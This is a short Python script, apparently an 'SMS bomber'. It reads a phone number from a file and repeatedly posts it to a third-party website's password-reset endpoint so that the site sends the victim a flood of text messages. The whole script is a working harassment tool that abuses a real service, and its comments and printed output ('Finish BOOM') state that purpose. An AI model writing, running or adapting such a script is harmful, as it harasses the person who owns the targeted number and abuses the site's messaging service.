import requests
import os

url = "https://amrtube.com/reset.php"
f = open("number.txt","r")
number = f.readline()
n = int(input("Number of sand SMS=> "))
count = 0
#sms boom start hear #
while count < n:
    os.system("sleep 2")
    post = {'phone': number}
    a = requests.post(url, data=post)
    print("[+] Massage Sand > "+number)
    count = count + 1
print("## Finish BOOM ##")
